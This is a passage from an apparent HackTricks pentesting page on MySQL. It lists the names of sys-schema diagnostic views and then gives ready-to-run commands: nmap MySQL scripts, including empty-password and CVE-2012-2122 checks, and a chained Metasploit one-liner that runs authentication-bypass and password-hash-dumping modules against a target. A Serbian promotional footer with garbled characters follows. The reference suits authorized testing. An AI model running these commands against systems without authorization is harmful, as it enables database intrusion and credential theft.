## x$memory\_by\_thread\_by\_current\_bytes

x$memory\_by\_thread\_by\_current\_bytes

## x$memory\_by\_user\_by\_current\_bytes

x$memory\_by\_user\_by\_current\_bytes

## x$memory\_global\_by\_current\_bytes

x$memory\_global\_by\_current\_bytes

## x$memory\_global\_total

x$memory\_global\_total

## x$processlist

x$processlist

## x$ps\_digest\_95th\_percentile\_by\_avg\_us

x$ps\_digest\_95th\_percentile\_by\_avg\_us

## x$ps\_digest\_avg\_latency\_distribution

x$ps\_digest\_avg\_latency\_distribution

## x$ps\_schema\_table\_statistics\_io

x$ps\_schema\_table\_statistics\_io

## x$schema\_flattened\_keys

x$schema\_flattened\_keys

## x$schema\_index\_statistics

x$schema\_index\_statistics

## x$schema\_table\_lock\_waits

x$schema\_table\_lock\_waits

## x$schema\_table\_statistics

x$schema\_table\_statistics

## x$schema\_table\_statistics\_with\_buffer

x$schema\_table\_statistics\_with\_buffer

## x$schema\_tables\_with\_full\_table\_scans

x$schema\_tables\_with\_full\_table\_scans

## x$session

x$session

## x$statement\_analysis

x$statement\_analysis

## x$statements\_with\_errors\_or\_warnings

x$statements\_with\_errors\_or\_warnings

## x$statements\_with\_full\_table\_scans

x$statements\_with\_full\_table\_scans

## x$statements\_with\_runtimes\_in\_95th\_percentile

x$statements\_with\_runtimes\_in\_95th\_percentile

## x$statements\_with\_sorting

x$statements\_with\_sorting

## x$statements\_with\_temp\_tables

x$statements\_with\_temp\_tables

## x$user\_summary

x$user\_summary

## x$user\_summary\_by\_file\_io

x$user\_summary\_by\_file\_io

## x$user\_summary\_by\_file\_io\_type

x$user\_summary\_by\_file\_io\_type

## x$user\_summary\_by\_stages

x$user\_summary\_by\_stages

## x$user\_summary\_by\_statement\_latency

x$user\_summary\_by\_statement\_latency

## x$user\_summary\_by\_statement\_type

x$user\_summary\_by\_statement\_type

## x$wait\_classes\_global\_by\_avg\_latency

x$wait\_classes\_global\_by\_avg\_latency

## x$wait\_classes\_global\_by\_latency

x$wait\_classes\_global\_by\_latency

## x$waits\_by\_host\_by\_latency

x$waits\_by\_host\_by\_latency

## x$waits\_by\_user\_by\_latency

x$waits\_by\_user\_by\_latency

## x$waits\_global\_by\_latency

x$waits\_global\_by\_latency

```
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql

Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

```

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji dogaƒëaj u vezi sa kibernetiƒçkom bezbedno≈°ƒáu u **≈†paniji** i jedan od najva≈ænijih u **Evropi**. Sa **misijom promovisanja tehniƒçkog znanja**, ovaj kongres je vrelo mesto susreta tehnolo≈°kih i kibernetiƒçkih struƒçnjaka u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju ogla≈°enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
